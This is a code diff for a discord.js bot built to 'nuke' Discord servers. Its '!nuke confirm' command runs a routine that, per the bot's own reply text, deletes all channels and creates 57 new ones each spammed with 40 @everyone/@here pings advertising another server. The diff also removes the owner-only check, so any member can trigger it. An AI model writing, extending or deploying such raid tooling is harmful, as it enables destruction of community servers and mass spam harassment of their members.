@@ -1,24 +1,14 @@
 const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');
-const fs = require('fs');
 
-// ---- LOAD TOKEN ----
-let TOKEN = process.env.TOKEN;
-let OWNER_ID = process.env.OWNER_ID;
+// ONLY need TOKEN from Railway env
+const TOKEN = process.env.TOKEN;
 
-if (!TOKEN || !OWNER_ID) {
-  try {
-    const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
-    TOKEN = config.TOKEN;
-    OWNER_ID = config.OWNER_ID;
-    console.log("✅ Loaded from config.json");
-  } catch (e) {
-    console.error("❌ NO TOKEN OR OWNER_ID in env or config.json");
-    process.exit(1);
-  }
+if (!TOKEN) {
+  console.error("❌ NO TOKEN. Set TOKEN in Railway environment variables.");
+  process.exit(1);
 }
 
 console.log(`🔑 Token loaded, length: ${TOKEN.length}`);
-if (TOKEN.length < 50) console.error("⚠️ Token looks too short");
 
 const client = new Client({
   intents: [
@@ -30,7 +20,6 @@ const client = new Client({
 });
 
 const prefix = '!';
-const ownerId = OWNER_ID;
 const spamMsg = `@everyone @here Lipad server mga kumag! https://discord.gg/qWD57gU7S __script__ . ~~boost~~ ||@everyone|| ||@here||`;
 
 function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
@@ -85,31 +74,29 @@ async function nukeGuild(guild) {
 
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
-  
-  // Set status: DND + custom text "@azairo"
+  // DND status with custom text @azairo
   client.user.setPresence({
     status: 'dnd',
-    activities: [{
-      name: '@azairo',
-      type: ActivityType.Custom,   // Custom status
-      state: '@azairo'             // The text shown
-    }]
+    activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }]
   });
-  console.log("✅ Status set to DND with custom text @azairo");
+  console.log("✅ Status: DND | @azairo");
 });
 
 client.on('messageCreate', async (msg) => {
   if (msg.author.bot || !msg.content.startsWith(prefix)) return;
   const args = msg.content.slice(prefix.length).trim().split(/ +/);
   const cmd = args.shift().toLowerCase();
-  if (cmd === 'nuke' && msg.author.id === ownerId) {
-    if (args[0] !== 'confirm') return msg.reply("⚠️ Type `!nuke confirm` to proceed.");
-    await msg.reply("💣 Nuking...");
+  
+  if (cmd === 'nuke') {
+    if (args[0] !== 'confirm') {
+      return msg.reply("⚠️ Type `!nuke confirm` to delete ALL channels and create 57 new ones with 40 pings each.");
+    }
+    await msg.reply("💣 NUKE ACTIVATED. Everything will be destroyed.");
     await nukeGuild(msg.guild);
   }
 });
 
 client.login(TOKEN).catch(err => {
   console.error("❌ Login failed:", err.message);
-  if (err.message.includes("token")) console.error("➡️ Your token is invalid. Reset it on Discord Developer Portal.");
+  if (err.message.includes("token")) console.error("➡️ Invalid token. Reset it on Discord Developer Portal.");
 });
